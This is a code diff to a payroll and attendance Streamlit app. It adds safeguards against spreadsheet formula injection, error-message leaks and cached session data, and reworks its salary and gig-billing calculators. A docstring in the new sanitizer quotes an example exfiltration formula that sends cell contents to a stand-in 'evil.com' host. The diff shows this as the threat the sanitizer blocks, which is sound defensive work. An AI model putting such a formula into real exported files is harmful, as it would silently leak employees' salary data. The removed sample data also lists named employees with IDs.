@@ -31,8 +31,6 @@ PAGES = [
     {"path": "pages/1_Long_Absence_Tracker.py", "label": "Long Absence Tracker", "icon": "📅"},
     {"path": "pages/2_Incentive_Validator.py", "label": "Incentive Validator", "icon": "💰"},
     {"path": "pages/3_Payroll_Calculator.py", "label": "Payroll Calculator", "icon": "🧾"},
-    {"path": "pages/4_Employee_Database.py", "label": "Employee Database", "icon": "👥"},
-    {"path": "pages/5_Paysheet_Operations.py", "label": "Paysheet Operations", "icon": "📋"},
 ]
 
 
@@ -73,12 +71,17 @@ def read_any_table(uploaded_file) -> pd.DataFrame:
 
 def to_excel_bytes(sheets: dict) -> bytes:
     """Convert a dict of {sheet_name: DataFrame} into an in-memory .xlsx file
-    and return the raw bytes, ready for st.download_button."""
+    and return the raw bytes, ready for st.download_button.
+
+    Every sheet is passed through `sanitize_dataframe_for_export()` first so
+    that no exported file can carry a formula-injection payload (a common
+    way sensitive data gets silently exfiltrated when a report is later
+    re-opened in Excel/Sheets by someone else)."""
     buffer = io.BytesIO()
     with pd.ExcelWriter(buffer, engine="xlsxwriter") as writer:
         for sheet_name, df in sheets.items():
             safe_name = str(sheet_name)[:31]  # Excel sheet name limit
-            df.to_excel(writer, index=False, sheet_name=safe_name)
+            sanitize_dataframe_for_export(df).to_excel(writer, index=False, sheet_name=safe_name)
     return buffer.getvalue()
 
 
@@ -90,6 +93,74 @@ def download_button_for_df(df: pd.DataFrame, label: str, file_name: str, key: st
         mime="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
         key=key,
     )
+
+
+# --------------------------------------------------------------------------
+# Data-leak / security hardening
+# --------------------------------------------------------------------------
+
+_FORMULA_TRIGGER_CHARS = ("=", "+", "-", "@", "\t", "\r")
+
+
+def sanitize_dataframe_for_export(df: pd.DataFrame) -> pd.DataFrame:
+    """Neutralizes CSV/Excel formula-injection payloads before any data
+    leaves the app as a downloadable file.
+
+    If a cell value (typically from an uploaded sheet) starts with =, +, -,
+    or @, Excel/Sheets will treat it as a formula when the exported file is
+    reopened. A malicious cell like `=HYPERLINK("http://evil.com/"&A1,"x")`
+    can silently exfiltrate adjacent salary data the moment someone opens
+    the report. Prefixing such cells with a leading apostrophe forces them
+    to render as plain text instead of executing.
+
+    This only rewrites string cells that start with a trigger character —
+    numbers, dates, and normal text are left untouched.
+    """
+    out = df.copy()
+    for col in out.columns:
+        if pd.api.types.is_object_dtype(out[col]) or pd.api.types.is_string_dtype(out[col]):
+            out[col] = out[col].apply(
+                lambda v: ("'" + v) if isinstance(v, str) and v.startswith(_FORMULA_TRIGGER_CHARS) else v
+            )
+    return out
+
+
+def safe_error_message(exc: Exception, context: str = "processing your data") -> str:
+    """Returns a generic, user-facing error message that never echoes raw
+    exception text back into the UI. Exception messages can accidentally
+    contain fragments of the underlying data (e.g. a bad cell value quoted
+    inside a pandas/KeyError message) — showing that verbatim in st.error
+    is itself a small data leak. Log `exc` server-side via your own logging
+    setup if you need the details; don't display it to end users.
+    """
+    return f"⚠️ Something went wrong while {context}. Please check your file's columns and format and try again."
+
+
+SENSITIVE_SESSION_KEYS = [
+    "employee_db",
+    "fulltime_data",
+    "payroll_result",
+    "gig_data",
+    "gig_result",
+]
+
+
+def clear_sensitive_session_data():
+    """Wipes all cached salary/employee data out of session_state. Streamlit
+    keeps session_state in server memory for as long as the browser tab's
+    session is alive — calling this lets you deliberately purge sensitive
+    payroll data once you're done with it, rather than leaving it sitting
+    in memory (e.g. on a shared workstation)."""
+    for key in SENSITIVE_SESSION_KEYS:
+        if key in st.session_state:
+            del st.session_state[key]
+
+
+def render_clear_data_button(label: str = "🔒 Clear cached data from this session"):
+    if st.button(label):
+        clear_sensitive_session_data()
+        st.success("Session data cleared.")
+        st.rerun()
 
 
 # --------------------------------------------------------------------------
@@ -144,67 +215,6 @@ DEFAULT_ABSENCE_THRESHOLDS = [
     ("To Be Checked (5-20 days)", 5, 20),
     ("Probable Exit Case (>20 days)", 21, None),
 ]
-
-
-def sample_attendance_muster() -> pd.DataFrame:
-    """Generate a sample attendance muster matching organization format.
-    
-    Columns: Employee ID, Employee Name, Designation, Location, then 25 date columns
-    with day-of-week headers and attendance codes.
-    
-    Attendance codes:
-    - P: Present
-    - A: Absent (flagged for tracking)
-    - H: Holiday
-    - R: Rest/Off Day
-    - VL: Vacation Leave
-    - LWP: Leave Without Pay
-    - CL: Casual Leave
-    - CL:P: Casual Leave + Present
-    - OFF: Off
-    - H:CL: Holiday + Casual Leave
-    """
-    from datetime import datetime, timedelta
-    
-    # Generate 25-day sample from June 1-25, 2024
-    start_date = datetime(2024, 6, 1)
-    dates = [start_date + timedelta(days=i) for i in range(25)]
-    day_names = ["Sat", "Sun", "Mon", "Tue", "Wed", "Thu", "Fri"]
-    
-    # Column headers: Employee info + dates with day names
-    columns = ["Employee ID", "Employee Name", "Designation", "Location"]
-    date_headers = [f"{d.strftime('%d')} {day_names[d.weekday()]}" for d in dates]
-    columns.extend(date_headers)
-    
-    # Sample employees with varied attendance patterns
-    employees_data = [
-        ["EM20230060183", "A DEVARAJA", "Driver", "Bangalore"],
-        ["EM20235150023", "A MARY ARPITHA", "Primary Teacher", "Maths, Bangalore"],
-        ["EM20225080294", "A RADHAMMA", "Maid", "Bangalore"],
-        ["EM20235060049", "A RAJESHWARI", "Bus Attendant", "Bangalore"],
-        ["EM20235180026", "A S LOKESHWARI", "Teacher", "HortCulture, Bangalore"],
-        ["EM20225060178", "A SANGEETA", "Teacher", "Social Studies, Bangalore"],
-        ["EM20245060094", "A SATHYA", "Primary Teacher", "Maths, Bangalore"],
-        ["EM20235180024", "A SELVI", "Maid", "Bangalore"],
-        ["EM20235040168", "A SHABANA GULZAR", "Teacher", "Bangalore"],
-    ]
-    
-    # Sample attendance patterns with variety
-    sample_pattern_1 = ["P", "P", "P", "P", "P", "H", "R", "P", "VL", "VL", "VL", "LWP", "P", "P", "P", "P", "P", "H", "R", "P", "P", "P", "P", "P", "P"]
-    sample_pattern_2 = ["P", "P", "LWP", "LWP", "LWP", "H", "R", "LWP", "LWP", "LWP", "P", "P", "P", "P", "P", "H", "R", "P", "P", "A", "A", "P", "P", "P", "P"]
-    sample_pattern_3 = ["A", "A", "A", "P", "P", "H", "R", "P", "CL", "CL", "CL", "P", "P", "P", "P", "H", "R", "P", "P", "P", "P", "P", "A", "A", "A"]
-    sample_pattern_4 = ["P", "P", "P", "P", "P", "H", "R", "P", "P", "P", "P", "P", "P", "P", "P", "H", "R", "P", "P", "P", "P", "P", "P", "P", "P"]
-    
-    patterns = [sample_pattern_1, sample_pattern_2, sample_pattern_3, sample_pattern_4, sample_pattern_1]
-    
-    # Assign patterns cyclically
-    data = []
-    for i, emp in enumerate(employees_data):
-        row = emp + patterns[i % len(patterns)]
-        data.append(row)
-    
-    df = pd.DataFrame(data, columns=columns)
-    return df
 
 
 # --------------------------------------------------------------------------
@@ -318,9 +328,8 @@ def compute_fulltime_payroll(
     """
     out = df.copy()
 
-    # Ensure HRA and Other are Series with matching length
-    hra = out[hra_col] if hra_col and hra_col in out.columns else pd.Series([0.0] * len(out), index=out.index)
-    other = out[other_allow_col] if other_allow_col and other_allow_col in out.columns else pd.Series([0.0] * len(out), index=out.index)
+    hra = out[hra_col] if hra_col and hra_col in out.columns else 0
+    other = out[other_allow_col] if other_allow_col and other_allow_col in out.columns else 0
 
     out["Gross Salary"] = out[basic_col] + hra + other
 
@@ -368,93 +377,91 @@ def compute_gig_worker_billing(
 
 
 # --------------------------------------------------------------------------
-# Reverse Calculations (In-Hand → Gross / Billing ↔ Amount)
+# 4. Gross <-> In-Hand converters
 # --------------------------------------------------------------------------
 
-def compute_fulltime_from_inhand(
-    in_hand_salary: float,
+def solve_gross_for_net_fulltime(
+    target_net: float,
+    fixed_allowances: float = 0.0,
     pf_wage_cap: float = 15000,
     apply_pf_cap: bool = True,
     pf_employee_pct: float = 12.0,
+    pf_employer_pct: float = 12.0,
     esic_threshold: float = 21000,
     esic_employee_pct: float = 0.75,
+    esic_employer_pct: float = 3.25,
+    tolerance: float = 1.0,
+    max_iterations: int = 100,
 ) -> dict:
-    """Reverse calculation: Given in-hand (net) salary, compute gross salary,
-    PF, and ESIC deductions.
-    
-    Uses iterative approach because PF wage cap affects the calculation:
-    - Net = Gross - PF_Deduction - ESIC_Deduction
-    - PF deduction depends on min(Basic, wage_cap), not Gross directly
-    - For simplicity, assumes Basic ≈ Gross (no HRA/Other deductions)
+    """Reverse calculation: given a target monthly in-hand (net take-home)
+    amount, finds the Basic Salary (and resulting Gross) that would produce
+    it, using bisection search.
+
+    This can't be solved with a plain formula because PF is capped at a
+    wage ceiling and ESIC only applies below a gross threshold (₹21,000
+    by default) — so Net(Gross) is a piecewise, not linear, function.
+    Bisection works because Net(Gross) is monotonically non-decreasing
+    (crossing the ESIC threshold only ever *removes* a deduction, which can
+    only increase net pay, never decrease it).
+
+    `fixed_allowances` = HRA + Other Allowances, treated as a fixed rupee
+    amount added on top of Basic for Gross, but NOT subject to PF (only
+    Basic is PF wage). Set to 0 if you want the entire amount to be Basic.
     """
-    # Start with an estimate: net ≈ gross / 1.13 (assuming 12% PF + 0.75% ESIC)
-    gross = in_hand_salary / 0.87  # Initial estimate
-    
-    # Iterate to find exact gross
-    for _ in range(10):
-        pf_wage = min(gross, pf_wage_cap) if apply_pf_cap else gross
-        pf_deduction = pf_wage * pf_employee_pct / 100
-        
-        esic_applicable = gross <= esic_threshold
-        esic_deduction = (gross * esic_employee_pct / 100) if esic_applicable else 0
-        
-        total_deductions = pf_deduction + esic_deduction
-        computed_net = gross - total_deductions
-        
-        # Adjust gross based on difference
-        if abs(computed_net - in_hand_salary) < 0.5:
+
+    def net_for_basic(basic):
+        df = pd.DataFrame([{"Basic": basic, "Other": fixed_allowances}])
+        result = compute_fulltime_payroll(
+            df, "Basic", None, "Other",
+            pf_wage_cap=pf_wage_cap, apply_pf_cap=apply_pf_cap,
+            pf_employee_pct=pf_employee_pct, pf_employer_pct=pf_employer_pct,
+            esic_threshold=esic_threshold,
+            esic_employee_pct=esic_employee_pct, esic_employer_pct=esic_employer_pct,
+        )
+        return result.iloc[0]
+
+    low, high = 0.0, max(target_net * 2.0, target_net + 100000.0) + 100000.0
+    mid = low
+    row = net_for_basic(high)
+    if row["Net Pay (Employee Take-home)"] < target_net:
+        high *= 3  # safety expansion if target is unreachable within initial bound
+
+    for _ in range(max_iterations):
+        mid = (low + high) / 2
+        row = net_for_basic(mid)
+        net = row["Net Pay (Employee Take-home)"]
+        if abs(net - target_net) <= tolerance:
             break
-        gross = gross + (in_hand_salary - computed_net)
-    
-    pf_wage = min(gross, pf_wage_cap) if apply_pf_cap else gross
-    pf_deduction = pf_wage * pf_employee_pct / 100
-    esic_applicable = gross <= esic_threshold
-    esic_deduction = (gross * esic_employee_pct / 100) if esic_applicable else 0
-    
+        if net < target_net:
+            low = mid
+        else:
+            high = mid
+
+    final_row = net_for_basic(mid)
     return {
-        "In-Hand Salary": in_hand_salary,
-        "Computed Gross": round(gross, 2),
-        "PF (Employee)": round(pf_deduction, 2),
-        "ESIC (Employee)": round(esic_deduction, 2),
-        "Total Deductions": round(pf_deduction + esic_deduction, 2),
-        "ESIC Applicable": esic_applicable,
+        "Basic": mid,
+        "Gross": final_row["Gross Salary"],
+        "row": final_row,
     }
 
 
-def compute_gig_amount_from_inhand(
-    in_hand: float,
-    tds_pct: float = 1.0,
-) -> dict:
-    """Reverse: Given in-hand amount for gig worker, compute billing amount.
-    Assumption: In-hand = Billing - TDS (worker keeps the net after TDS deduction)
-    So: Billing = In-Hand / (1 - TDS%)
-    """
-    if tds_pct >= 100:
-        return {"error": "TDS % must be less than 100%"}
-    
-    billing = in_hand / (1 - tds_pct / 100)
-    tds_amount = billing * tds_pct / 100
-    
+def gig_inhand_to_billing(inhand_amount: float, tds_pct: float = 1.0) -> dict:
+    """Forward: worker's in-hand payment -> billing amount (Amount + TDS)."""
+    tds_amount = inhand_amount * tds_pct / 100
     return {
-        "In-Hand Amount": round(in_hand, 2),
-        "Monthly Billing Amount": round(billing, 2),
-        "TDS Amount": round(tds_amount, 2),
+        "In-Hand Amount": inhand_amount,
+        "TDS Amount": tds_amount,
+        "Billing Amount": inhand_amount + tds_amount,
     }
 
 
-def compute_gig_inhand_from_billing(
-    billing: float,
-    tds_pct: float = 1.0,
-) -> dict:
-    """Given monthly billing amount, compute in-hand amount and TDS.
-    In-Hand = Billing - TDS
-    TDS = Billing * TDS%
+def gig_billing_to_inhand(billing_amount: float, tds_pct: float = 1.0) -> dict:
+    """Reverse: known billing amount -> worker's in-hand payment.
+    Since Billing = Amount * (1 + tds%/100), Amount = Billing / (1 + tds%/100).
     """
-    tds_amount = billing * tds_pct / 100
-    in_hand = billing - tds_amount
-    
+    inhand = billing_amount / (1 + tds_pct / 100)
     return {
-        "Monthly Billing Amount": round(billing, 2),
-        "TDS Amount": round(tds_amount, 2),
-        "In-Hand Amount": round(in_hand, 2),
+        "Billing Amount": billing_amount,
+        "TDS Amount": billing_amount - inhand,
+        "In-Hand Amount": inhand,
     }
